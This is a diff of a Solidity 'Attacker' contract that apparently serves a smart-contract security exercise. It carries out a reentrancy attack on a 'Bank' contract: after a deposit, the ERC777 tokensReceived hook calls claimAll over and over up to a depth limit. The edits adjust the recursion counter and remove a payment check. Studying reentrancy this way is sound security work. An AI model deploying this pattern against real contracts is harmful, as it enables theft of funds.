@@ -28,7 +28,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 	function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
 		bank = Bank(bank_address);
         _grantRole(ATTACKER_ROLE, address(this));
-        _grantRole(ATTACKER_ROLE, bank.token().address);
+        _grantRole(ATTACKER_ROLE, address(bank.token()));
 	}
 
 	/*
@@ -37,10 +37,9 @@ contract Attacker is AccessControl, IERC777Recipient {
 	*/
 	function attack(uint256 amt) payable public {
       require( address(bank) != address(0), "Target bank not set" );
-	  require(msg.value == amt, "Incorrect ETH sent");
-	  bank.deposit{value: amt}();
-	  emit Deposit(amt);
-	  bank.claimAll();
+		bank.deposit{value: amt}();
+		emit Deposit(amt);
+		bank.claimAll();
 	}
 
 	/*
@@ -65,8 +64,8 @@ contract Attacker is AccessControl, IERC777Recipient {
 	) external {
 		require(msg.sender == address(bank.token()), "Invalid token");
 		if (depth < max_depth) {
-			depth++;
 			emit Recurse(depth);
+			depth++;
 			bank.claimAll();
 		}
 	}
